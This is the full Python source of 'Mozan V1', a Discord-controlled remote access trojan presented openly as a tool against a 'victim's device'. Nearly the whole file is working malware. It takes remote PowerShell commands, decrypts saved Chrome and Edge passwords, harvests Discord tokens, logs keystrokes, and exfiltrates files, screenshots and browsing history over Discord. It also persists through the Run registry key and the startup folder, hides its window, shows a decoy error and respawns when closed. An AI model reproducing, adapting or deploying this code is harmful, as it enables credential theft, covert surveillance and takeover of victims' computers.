"""
Mozan V1 🐀🤑
made by Werdane

Commands:
(Any text without '!' at the begining would be treated as powershell commands)

> !download - lets you download files from victim's device 💻 ➡ 📁
> !upload - lets you upload files to victim's device 📁 ➡ 💻
> !screenshot - lets you screenshot the victim's pc 📸 💻
> !whatismyip - gets victim's ip address 😎 💻
> !getdiscord - gets the victim's discord token 🤣
> !showhistory - gets the victim's history 😳
> !startlog - starts keystroke and click logger ⌨ 🖱
> !retrievelog - retrieves the log 📜
> !clearlog - clears the log 📜 🚮
> !stoplog - stops keylogging ⌨ 🤚
> !getpasswords - gets passwords from Edge and Chrome browser 🔐
> !startup - copies the script to Windows startup folder 🚀
> !tt - text to speech, plays whatever you want out loud 🔊
> !open - opens a website in the default browser 🌐
> !screenoff - turns off the screen for specified seconds (default: 10) 🖥️
> !screenoff - turns off the screen for specified seconds (default: 10) 🖥️
> !checktoken - checks a discord token for validity and info 🔍
> !wallpaper - changes the desktop wallpaper 🖼️

Aliases:
!dl, !up, !ss, !ip, !dc, !hist, !sl, !rl, !cl, !xl, !gp, !boot, !off, !ct, !wall
"""
import discord
import asyncio
from discord.ext import commands
import subprocess
import os
import socket
import pyautogui
import re, requests
import zipfile
import winreg as reg
import browser_history as bh
from datetime import datetime
from re import findall
from pynput import mouse, keyboard
from Crypto.Cipher import AES
import sqlite3
import win32crypt
import json
import base64
import shutil
import time
import sys
import pyttsx3
import webbrowser
import ctypes
import logging
import traceback

# Configuration (Placeholders for Builder)
BOT_TOKEN = "[BOT_TOKEN]"
FAKE_ERROR_ENABLED = "[FAKE_ERROR_ENABLED]"
FAKE_ERROR_MESSAGE = "[FAKE_ERROR_MESSAGE]"
STEALTH_MODE = "[STEALTH_MODE]"

def show_fake_error():
    if FAKE_ERROR_ENABLED == "True":
        ctypes.windll.user32.MessageBoxW(0, FAKE_ERROR_MESSAGE, "Error", 0x10 | 0x0)

if __name__ == "__main__":
    show_fake_error()

# Hide console window
if STEALTH_MODE == "True":
    if getattr(sys, 'frozen', False):
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)

debug_log_path = os.path.join(os.getenv('APPDATA'), 'bot_log.txt')
logging.basicConfig(
    filename=debug_log_path,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logging.info("Bot starting up...")

# Suppress discord.py logs completely
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.client').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)

def log_error(msg):
    logging.error(msg)
    print(msg)

def log_info(msg):
    logging.info(msg)
    print(msg)

# Console hiding logic moved to main block

import threading
import itertools

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Protect')
if not os.path.exists(startup_folder):
    os.makedirs(startup_folder)
# BOT_TOKEN placeholder is at the top

if getattr(sys, 'frozen', False): 
    current_file_path = sys.executable 
else: 
    current_file_path =os.path.abspath(__file__)

MAX_FILE_SIZE = 10 * 1024 * 1024
DISCORD_MAX_MESSAGE_LENGTH = 2000
 # you can change this to make it more difficult for user to find the file :)
destination_path = os.path.join(startup_folder, os.path.basename(sys.executable))
log_file_path = startup_folder + "\\activity_log.txt"
try:
    logging.info(f"Current executable: {current_file_path}")
    logging.info(f"Stealth destination: {destination_path}")
    
    # Ensure hidden folder exists
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
        logging.info(f"Created folder: {startup_folder}")
    
    # Copy to hidden folder if not already there
    if current_file_path.lower() != destination_path.lower():
        try:
            shutil.copy2(current_file_path, destination_path)
            logging.info("Successfully copied to stealth location")
        except Exception as e:
            logging.error(f"Copy error: {e}")


    def add_to_startup(file_path):
        try:
            import winreg as reg
            key = reg.HKEY_CURRENT_USER
            key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key2 = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

            reg.SetValueEx(key2, 'rr5', 0, reg.REG_SZ, file_path)
            reg.CloseKey(key2)
            logging.info(f"Added to Startup: {file_path}")
        except Exception as e:
            logging.error(f"Startup reg error: {e}")

    add_to_startup(destination_path)

    add_to_startup(destination_path)



    description = '''A simple discord bot that uses channels as a way to interact with clients.'''

    intents = discord.Intents.default()
    intents.members = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='!', description=description, intents=intents, help_command=None)
    computer_directories = {}
    hostname_to_channel = {}



    ######################################################## START OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## START OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## START OF PASSWORD STEALING FUNCTIONS ########################################################

    # This part is a modified code of code I got from https://github.com/mpdg837/ZlodzejHasel
    def get_master_key():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)
                if not encrypted_key:
                    print("No encrypted key found")
                    return None
        except Exception as e:
            print(f"Error reading master key file: {e}")
            return None
        try:
            master_key = base64.b64decode(encrypted_key)
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error decrypting master key: {e}")
            return None

    def get_master_key_chr():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)
                if not encrypted_key:
                    print("No encrypted key found")
                    return None
            master_key = base64.b64decode(encrypted_key)
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error getting Chrome master key: {e}")
            return None

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return None

    def get_password_edge():
        try:
            master_key = get_master_key()
            if not master_key:
                return []
            
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            try:
                shutil.copy2(login_db, "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
            except Exception as e:
                print(f"Error copying database: {e}")
                return []

            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            login_data = []

            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if username and decrypted_password:
                        login_data.append({
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        })
            except Exception as e:
                print(f"Error fetching logins: {e}")
            finally:
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

            return login_data
        except Exception as e:
            print(f"Error in get_password_edge: {e}")
            return []

    def get_passwords():
        try:
            main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data' + os.sep
            possible_locations = ["Default", "Guest Profile"]
            for folder in os.listdir(main_loc):
                if "Profile " in folder:
                    possible_locations.append(folder)

            master_key = get_master_key_chr()
            if master_key is None:
                return []

            passwords = []

            for loc in possible_locations:
                try:
                    path_db = main_loc + loc + os.sep + 'Login Data'
                    db_loc = os.getcwd() + os.sep + "Loginvault.db"

                    shutil.copy2(path_db, db_loc)  # making a temp copy since Login Data DB is locked while Chrome is running
                    conn = sqlite3.connect(db_loc)
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            if len(username) > 0 and decrypted_password != "Chrome < 80":
                                passwords.append({
                                    'url': url,
                                    'username': username,
                                    'password': decrypted_password
                                })
                    except Exception as e:
                        print(f"Error fetching logins from {loc}: {e}")
                    cursor.close()
                    conn.close()
                    try:
                        os.remove(db_loc)
                        time.sleep(0.2)
                    except Exception as e:
                        print(f"Error removing temporary database: {e}")
                except Exception as e:
                    print(f"Error accessing location {loc}: {e}")

            return passwords
        except Exception as e:
            print(f"Error in get_passwords: {e}")
            return []

    ######################################################## END OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## END OF PASSWORD STEALING FUNCTIONS ########################################################
    ######################################################## END OF PASSWORD STEALING FUNCTIONS ########################################################



    @bot.event
    async def on_ready():
        global destination_path
        # Stop animation and clear line
        stop_animation_event.set()
        await asyncio.sleep(0.5) # non-blocking sleep
        
        log_info(f'[+] Connected as {bot.user}')
        
        hostname = socket.gethostname().lower()
        sanitized_hostname = "".join([c if c.isalnum() else "-" for c in hostname])
        
        for guild in bot.guilds:
            channel = discord.utils.get(guild.channels, name=sanitized_hostname)
            if not channel:
                try:
                    channel = await guild.create_text_channel(sanitized_hostname)
                    log_info(f"[+] Created channel {sanitized_hostname} in {guild.name}")
                except Exception as e:
                    log_error(f"[-] Failed to create channel in {guild.name}: {e}")
                    continue
            
            if channel:
                try:
                    embed = discord.Embed(
                        title=f"💻 {hostname} connected",
                        description="✅ Bot is ready. Use `!help` to see commands.",
                        color=0x00FF00
                    )
                    embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    await channel.send(embed=embed)
                    log_info(f"[+] Sent connection message to {guild.name}/#{sanitized_hostname}")
                except Exception as e:
                    log_error(f"[-] Failed to send message to {guild.name}: {e}")

    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return

        hostname = socket.gethostname().lower()
        if hostname not in computer_directories:
            computer_directories[hostname] = os.getcwd()
            
        current_directory = computer_directories.get(hostname, os.getcwd())
        
        # (REMOVED RESTRICTIVE CHANNEL CHECKS)
        # Any channel the bot can see is now valid for commands.
        if not message.content.startswith('!'):
            cmd = message.content[0:].strip()
            if cmd.startswith('cd '):
                new_directory = cmd[3:].strip()
                try:
                    os.chdir(new_directory)
                    computer_directories[hostname] = os.getcwd()
                    await message.channel.send(f'Changed directory to {computer_directories[hostname]}')
                except Exception as e:
                    await message.channel.send(f'An error occurred: {str(e)}')
            else:
                try:
                    result = subprocess.check_output(["powershell.exe", "-Command", cmd], shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
                    output = result.decode("utf-8")
                    if len(output) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('output.txt', 'w', encoding='utf-8') as f:
                            f.write(output)
                        await message.channel.send(file=discord.File('output.txt'))
                    else:
                        await message.channel.send(f'```\n{output}\n```')
                except subprocess.CalledProcessError as e:
                    output = e.output.decode("utf-8")
                    if len(output) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('error_output.txt', 'w', encoding='utf-8') as f:
                            f.write(output)
                        await message.channel.send(file=discord.File('error_output.txt'))
                    else:
                        await message.channel.send(f'```\n{output}\n```')
                except Exception as e:
                    error_message = str(e)
                    if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('exception_output.txt', 'w', encoding='utf-8') as f:
                            f.write(error_message)
                        await message.channel.send(file=discord.File('exception_output.txt'))
                    else:
                        await message.channel.send(f'An error occurred: {error_message}')
        else:
            await bot.process_commands(message)

    ######################

    def on_key_press(key):
        with open(log_file_path, 'a') as f:
            f.write(f"{datetime.now()} - Key pressed: {key}\n")

    def on_click(x, y, button, pressed):
        if pressed:
            with open(log_file_path, 'a') as f:
                f.write(f"{datetime.now()} - Mouse clicked at ({x}, {y}) with {button}\n")

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    @bot.command(aliases=['gp'])
    async def getpasswords(ctx):
        hostname = socket.gethostname().lower()

        try:
            passwords = get_passwords()
            passwords_edge = get_password_edge()
            with open('passwords.txt', 'w', encoding='utf-8') as f:
                for entry in passwords:
                    f.write(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n\n")
                for entry in passwords_edge:
                    f.write(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n\n")

            await ctx.send(file=discord.File('passwords.txt'))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')


    @bot.command(aliases=['sl'])
    async def startlog(ctx):
        hostname = socket.gethostname().lower()

        try:
            with open(log_file_path, 'a') as f:
                f.write(f"Logging started at {datetime.now()}\n")
            keyboard_listener.start()
            mouse_listener.start()
            await ctx.send("Logging has started.")
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['rl'])
    async def retrievelog(ctx):
        hostname = socket.gethostname().lower()

        try:
            await ctx.send(file=discord.File(log_file_path))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['cl'])
    async def clearlog(ctx):
        hostname = socket.gethostname().lower()

        try:
            open(log_file_path, 'w').close()
            await ctx.send("Log file has been cleared.")
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['xl'])
    async def stoplog(ctx):
        hostname = socket.gethostname().lower()

        try:
            keyboard_listener.stop()
            mouse_listener.stop()
            await ctx.send("Logging has stopped.")
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    ###

    @bot.command(aliases=['hist'])
    async def showhistory(ctx):
        hostname = socket.gethostname().lower()

        try:
            outputs = bh.get_history().histories
            with open('browser_history.txt', 'w', encoding='utf-8') as f:
                for timestamp, url, title in outputs:
                    f.write(f"Timestamp: {timestamp}\nURL: {url}\nTitle: {title}\n\n")

            await ctx.send(file=discord.File('browser_history.txt'))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['ss'])
    async def screenshot(ctx):
        hostname = socket.gethostname().lower()

        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(computer_directories[hostname], 'screenshot.png')
            screenshot.save(screenshot_path)
            await ctx.send(file=discord.File(screenshot_path))
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['ip'])
    async def whatismyip(ctx):
        hostname = socket.gethostname().lower()

        try:
            r = requests.get('https://ipinfo.io/json').text
            if len(r) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('ip_info.txt', 'w', encoding='utf-8') as f:
                    f.write(r)
                await ctx.send(file=discord.File('ip_info.txt'))
            else:
                await ctx.send(f'```{r}```')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['dl'])
    async def download(ctx, *, file_path):
        hostname = socket.gethostname().lower()

        try:
            if os.path.exists(file_path):
                if os.path.isdir(file_path) or os.path.getsize(file_path) > MAX_FILE_SIZE:
                    compressed_file_path = f"{file_path}.zip"
                    with zipfile.ZipFile(compressed_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        if os.path.isdir(file_path):
                            for root, dirs, files in os.walk(file_path):
                                for file in files:
                                    zipf.write(os.path.join(root, file),
                                            os.path.relpath(os.path.join(root, file), file_path))
                        else:
                            zipf.write(file_path, os.path.basename(file_path))

                    file_path = compressed_file_path

                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send(f'The path `{file_path}` does not exist.')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred while sending the file: {error_message}')




    @bot.command(aliases=['up'])
    async def upload(ctx, url: str = None):
        hostname = socket.gethostname().lower()

        if url:
            try:
                filename = os.path.basename(url)
                file_path = os.path.join(computer_directories[hostname], filename)
                response = requests.get(url)
                response.raise_for_status() 
                with open(file_path, 'wb') as file:
                    file.write(response.content)
                await ctx.send(f'File {filename} downloaded and saved to {file_path}')
            except Exception as e:
                error_message = str(e)
                if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                    with open('exception_output.txt', 'w', encoding='utf-8') as f:
                        f.write(error_message)
                    await ctx.send(file=discord.File('exception_output.txt'))
                else:
                    await ctx.send(f'An error occurred while downloading the file: {error_message}')
        elif ctx.message.attachments:
            for attachment in ctx.message.attachments:
                try:
                    file_path = os.path.join(computer_directories[hostname], attachment.filename)
                    await attachment.save(file_path)
                    await ctx.send(f'File {attachment.filename} saved to {file_path}')
                except Exception as e:
                    error_message = str(e)
                    if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                        with open('exception_output.txt', 'w', encoding='utf-8') as f:
                            f.write(error_message)
                        await ctx.send(file=discord.File('exception_output.txt'))
                    else:
                        await ctx.send(f'An error occurred while saving the file: {error_message}')
        else:
            await ctx.send('No file attached or URL provided.')

    @bot.command(aliases=['dc'])
    async def getdiscord(ctx):
        
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = [
            ROAMING + "\\Discord",
            ROAMING + "\\discordcanary",
            ROAMING + "\\discordptb",
            LOCAL + "\\Google\\Chrome\\User Data\\Default",
            ROAMING + "\\Opera Software\\Opera Stable",
            LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
            LOCAL + '\\Microsoft\\Edge\\User Data\\Default'
        ]
        tokens = []
        for path in PATHS:

            path += "\\Local Storage\\leveldb"
            
            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                tokens.append(token)
            else:
                continue
        return await ctx.send(tokens)

    @bot.command(aliases=['boot'])
    async def startup(ctx):
        hostname = socket.gethostname().lower()

        try:
            # Get the Windows startup folder path
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            
            # Get the current file path
            if getattr(sys, 'frozen', False):
                source_file = sys.executable
            else:
                source_file = os.path.abspath(__file__)
            
            # Get the filename
            filename = os.path.basename(source_file)
            destination = os.path.join(startup_folder, filename)
            
            # Copy the file to startup folder
            shutil.copy2(source_file, destination)
            
            await ctx.send(f'✅ File copied to startup folder: `{destination}`')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command()
    async def help(ctx):
        log_info(f"Help command requested by {ctx.author} in {ctx.channel}")
        try:
            hostname = socket.gethostname().lower()

            embed = discord.Embed(
                title="twxerzzWare 🐀🐀 - Available Commands",
                description="Made by twz\n\n(Any text without '!' at the beginning will be treated as PowerShell commands)",
                color=0x000000
            )
            embed.add_field(
                name="Commands (1/2)",
                value="""`!download` (!dl) - Download files from victim's device 💻➡📁
`!upload` (!up) - Upload files to victim's device 📁➡💻
`!screenshot` (!ss) - Screenshot the victim's PC 📸💻
`!whatismyip` (!ip) - Get victim's IP address 😎💻
`!getdiscord` (!dc) - Get the victim's Discord token 🤣
`!showhistory` (!hist) - Get the victim's browser history 😳
`!startlog` (!sl) - Start keystroke and click logger ⌨🖱
`!retrievelog` (!rl) - Retrieve the log 📜
`!clearlog` (!cl) - Clear the log 📜🚮
`!stoplog` (!xl) - Stop keylogging ⌨🤚""",
                inline=False
            )
            embed.add_field(
                name="Commands (2/2)",
                value="""`!getpasswords` (!gp) - Get passwords from Edge and Chrome browser 🔐
`!startup` (!boot) - Copy the script to Windows startup folder 🚀
`!tt` - Text to speech, plays whatever you want out loud 🔊
`!open` - Open a website in the default browser 🌐
`!screenoff` (!off) [seconds] - Turn off the screen for specified seconds (default: 10) 🖥️
`!checktoken` (!ct) [token] - Check a Discord token for validity and info 🔍
`!wallpaper` (!wall) [url/attachment] - Change the desktop wallpaper 🖼️
`!lock` - Locks the victim's keyboard and mouse 🔒
`!unlock` - Unlocks the victim's keyboard and mouse 🔓
`!help` - Show this help message""",
                inline=False
            )
            embed.add_field(
                name="Current Host",
                value=f"```{hostname}```",
                inline=False
            )
            await ctx.send(embed=embed)
        except Exception as e:
            log_error(f"Error in help command: {e}")
            await ctx.send(f"❌ Error displaying help: {e}")

    @bot.event
    async def on_command_error(ctx, error):
        log_error(f"Command error in {ctx.command}: {error}")
        if isinstance(error, commands.CommandNotFound):
            pass # Ignore unknown commands
        else:
            await ctx.send(f"❌ Error: {error}")

    @bot.command()
    async def tt(ctx, *, text):
        hostname = socket.gethostname().lower()

        try:
            # Initialize the TTS engine
            engine = pyttsx3.init()
            
            # Set properties (optional - you can adjust these)
            engine.setProperty('rate', 150)  # Speed of speech
            engine.setProperty('volume', 1.0)  # Volume (0.0 to 1.0)
            
            # Speak the text
            engine.say(text)
            engine.runAndWait()
            
            await ctx.send(f'✅ Text-to-speech played: "{text}"')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(name='open')
    async def open_url(ctx, *, url):
        hostname = socket.gethostname().lower()

        try:
            # Add http:// or https:// if not present
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            # Open the URL in the default browser
            webbrowser.open(url)
            
            await ctx.send(f'✅ Opened website: `{url}`')
        except Exception as e:
            error_message = str(e)
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['off'])
    async def screenoff(ctx, duration: int = 10):
        hostname = socket.gethostname().lower()

        try:
            # Validate duration
            if duration < 1:
                duration = 1
            if duration > 3600:  # Max 1 hour
                duration = 3600
            
            await ctx.send(f'🖥️ Turning off screen for {duration} seconds...')
            
            # Turn off monitor using Windows API
            # SendMessage with WM_SYSCOMMAND and SC_MONITORPOWER
            # -1 = HWND_BROADCAST, 0x0112 = WM_SYSCOMMAND, 0xF170 = SC_MONITORPOWER, 2 = Monitor off
            ctypes.windll.user32.SendMessageW(-1, 0x0112, 0xF170, 2)
            
            # Wait for the specified duration
            time.sleep(duration)
            
            # Wake up the monitor by moving mouse slightly (invisible move)
            pyautogui.moveRel(1, 1)
            pyautogui.moveRel(-1, -1)
            
            await ctx.send(f'✅ Screen turned back on after {duration} seconds')
        except Exception as e:
            error_message = str(e)
            # Try to wake screen in case of error
            try:
                pyautogui.moveRel(1, 1)
                pyautogui.moveRel(-1, -1)
            except:
                pass
            
            if len(error_message) > DISCORD_MAX_MESSAGE_LENGTH:
                with open('exception_output.txt', 'w', encoding='utf-8') as f:
                    f.write(error_message)
                await ctx.send(file=discord.File('exception_output.txt'))
            else:
                await ctx.send(f'An error occurred: {error_message}')

    @bot.command(aliases=['ct'])
    async def checktoken(ctx, token: str = None):
        hostname = socket.gethostname().lower()

        if not token:
            await ctx.send("❌ Please provide a token to check.")
            return

        await ctx.send("🔍 Checking token...")
        
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if response.status_code == 200:
                user_data = response.json()
                
                username = f"{user_data['username']}#{user_data['discriminator']}" if user_data.get('discriminator') != '0' else user_data['username']
                user_id = user_data['id']
                email = user_data.get('email', 'N/A')
                phone = user_data.get('phone', 'N/A')
                mfa_enabled = user_data.get('mfa_enabled', False)
                
                nitro_type = user_data.get('premium_type', 0)
                nitro_str = "None"
                if nitro_type == 1:
                    nitro_str = "Nitro Classic"
                elif nitro_type == 2:
                    nitro_str = "Nitro"
                elif nitro_type == 3:
                    nitro_str = "Nitro Basic"
                
                embed = discord.Embed(
                    title="Token Valid ✅",
                    color=0x000000
                )
                embed.add_field(name="Username", value=f"`{username}`", inline=True)
                embed.add_field(name="ID", value=f"`{user_id}`", inline=True)
                embed.add_field(name="Nitro", value=f"`{nitro_str}`", inline=True)
                embed.add_field(name="Email", value=f"`{email}`", inline=True)
                embed.add_field(name="Phone", value=f"`{phone}`", inline=True)
                embed.add_field(name="2FA", value=f"`{'Enabled' if mfa_enabled else 'Disabled'}`", inline=True)
                
                await ctx.send(embed=embed)
            elif response.status_code == 401:
                embed = discord.Embed(
                    title="Token Invalid ❌",
                    description="The provided token is invalid or expired.",
                    color=0x000000
                )
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"❌ Error checking token: Status Code {response.status_code}")
                
        except Exception as e:
            await ctx.send(f"❌ An error occurred: {str(e)}")

    @bot.command()
    async def lock(ctx):
        hostname = socket.gethostname().lower()
        try:
            # BlockInput returns 0 if it fails (often due to lack of admin rights)
            res = ctypes.windll.user32.BlockInput(True)
            if res:
                await ctx.send("✅ User input has been locked!")
            else:
                await ctx.send("❌ Failed to lock input. This usually requires administrative privileges.")
        except Exception as e:
            await ctx.send(f"❌ An error occurred: {str(e)}")

    @bot.command()
    async def unlock(ctx):
        hostname = socket.gethostname().lower()
        try:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("✅ User input has been unlocked!")
        except Exception as e:
            await ctx.send(f"❌ An error occurred: {str(e)}")

    @bot.command(aliases=['wall'])
    async def wallpaper(ctx, url: str = None):
        hostname = socket.gethostname().lower()

        if not url and not ctx.message.attachments:
            await ctx.send("❌ Please provide an image URL or attach an image.")
            return

        try:
            image_path = os.path.join(startup_folder, "wallpaper_temp.jpg")
            
            if ctx.message.attachments:
                await ctx.message.attachments[0].save(image_path)
            else:
                response = requests.get(url)
                if response.status_code == 200:
                    with open(image_path, 'wb') as f:
                        f.write(response.content)
                else:
                    await ctx.send("❌ Failed to download image from URL.")
                    return

            # Set wallpaper using Windows API
            # SPI_SETDESKWALLPAPER = 20
            # SPIF_UPDATEINIFILE = 0x01
            # SPIF_SENDWININICHANGE = 0x02
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
            
            await ctx.send("✅ Wallpaper changed successfully!")
            
        except Exception as e:
            await ctx.send(f"❌ An error occurred: {str(e)}")

    # Console Animation Logic
    stop_animation_event = threading.Event()

    def animate_loading():
        for c in itertools.cycle(['.', '..', '...']):
            if stop_animation_event.is_set():
                break
            # Blue text: \033[94m
            sys.stdout.write(f'\r\033[94m{{+}} running {c}\033[0m   ')
            sys.stdout.flush()
            time.sleep(0.5)
            sys.stdout.write('\r' + ' ' * 50 + '\r') # Clear line

    # Clear console at startup
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Start animation in background thread
    t = threading.Thread(target=animate_loading)
    t.daemon = True
    t.start()

    log_info("Starting bot run loop...")
    bot.run(BOT_TOKEN, log_handler=None)
except Exception as e:
    logging.critical(f"FATAL ERROR during startup: {e}")
    logging.critical(f"Traceback: {traceback.format_exc()}")
except SystemExit:
    subprocess.Popen([destination_path], creationflags=subprocess.CREATE_NO_WINDOW)
